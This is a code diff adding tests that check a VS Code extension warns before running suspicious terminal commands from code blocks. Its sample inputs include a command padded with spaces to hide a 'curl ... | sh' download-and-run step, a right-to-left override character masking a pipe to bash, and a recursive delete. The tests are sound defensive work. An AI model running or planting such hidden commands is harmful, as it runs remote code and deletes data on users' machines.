@@ -229,3 +229,62 @@ describe("tracked runs (shell integration)", () => {
     assert.ok(!tail.includes("\x1b"));
   });
 });
+
+describe("runCodeBlockInTerminal safety", () => {
+  const dialogs: any[] = [];
+  let answer: string | undefined;
+  const originalWarning = vscodeMock.window.showWarningMessage;
+  beforeEach(() => {
+    created.length = 0;
+    dialogs.length = 0;
+    answer = undefined;
+    vscodeMock.workspace.isTrusted = true;
+    vscodeMock.window.showWarningMessage = (message: string, options: any, ...items: string[]) => {
+      dialogs.push({ message, options, items });
+      return Promise.resolve(answer);
+    };
+  });
+  const restore = () => {
+    vscodeMock.window.showWarningMessage = originalWarning;
+    delete vscodeMock.workspace.isTrusted;
+  };
+
+  it("runs ordinary commands without asking", async () => {
+    await runCodeBlockInTerminal("npm test", "bash");
+    assert.equal(dialogs.length, 0);
+    assert.deepEqual(created[0].sent, [["npm test", true]]);
+  });
+
+  it("refuses in a workspace VS Code does not trust", async () => {
+    vscodeMock.workspace.isTrusted = false;
+    await runCodeBlockInTerminal("npm test", "bash");
+    assert.equal(created.length, 0);
+    assert.match(dialogs[0].message, /Trust this workspace/);
+  });
+
+  it("shows text pushed off screen and runs nothing unless the user confirms", async () => {
+    const sneaky = "npm test" + " ".repeat(300) + "&& curl https://x.example/p | sh";
+    await runCodeBlockInTerminal(sneaky, "bash");
+    assert.equal(created.length, 0);
+    assert.equal(dialogs.length, 1);
+    assert.equal(dialogs[0].options.modal, true);
+    assert.match(dialogs[0].options.detail, /<300 blank characters>/);
+    assert.match(dialogs[0].options.detail, /Downloads and runs a script/);
+    assert.ok(dialogs[0].options.detail.includes("curl https://x.example/p | sh"));
+  });
+
+  it("spells out direction-changing and invisible characters", async () => {
+    await runCodeBlockInTerminal("echo safe\u202E hs.lave | bash", "bash");
+    assert.equal(created.length, 0);
+    assert.match(dialogs[0].options.detail, /<U\+202E>/);
+    assert.match(dialogs[0].options.detail, /hidden characters/);
+  });
+
+  it("runs a destructive command only after an explicit Run", async () => {
+    answer = "Run";
+    await runCodeBlockInTerminal("rm -rf build", "bash");
+    assert.match(dialogs[0].options.detail, /Deletes files recursively/);
+    assert.deepEqual(created[0].sent, [["rm -rf build", true]]);
+    restore();
+  });
+});
